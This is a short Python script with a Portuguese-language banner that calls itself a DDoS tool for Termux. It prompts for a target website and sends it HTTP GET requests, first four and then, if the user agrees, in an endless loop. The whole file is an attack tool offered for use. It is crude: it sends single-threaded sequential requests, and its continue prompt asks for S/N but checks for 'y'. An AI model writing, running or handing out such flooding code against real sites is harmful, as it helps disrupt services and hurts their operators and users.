import os

os.system('pip install termcolor && pip install colored && pip install requests && clear')
import termcolor
from termcolor import colored

def main():

    print(colored("************************",'blue'))
    print(colored("*                      *",'blue'))
    print(colored("*  Ddos pelo termux    *",'blue'))
    print(colored("*                      *",'blue'))
    print(colored("************************",'blue'))

    print(colored("| feito por: PegasuS |\n", 'green'))


main()

import requests
def dos():

        s = input(colored("digite seu alvo\n exemplo: site.ir\n\n ~> ",'magenta'))

        r = requests.get("http://"+s)

        print(colored("\nPocket was sent",'red'))

        r = requests.get("http://"+s)

        print(colored("Pocket was sent",'blue'))

        r = requests.get("http://"+s)

        print(colored("Pocket was sent",'red'))

        r = requests.get("http://"+s)

        print(colored("Pocket was sent",'blue'))

        c = input(colored("QUER CONTINUAR? S/N? ~> ",'yellow'))

        if c == 'y':
            while True:
                r = requests.get("http://"+s)
                print(colored("Pocket was sent", 'red'))
                r = requests.get("http://"+s)
                print(colored("Pocket was sent", 'blue'))
        elif c == 'n':
            os.system('clear')
            main()
            dos()


dos()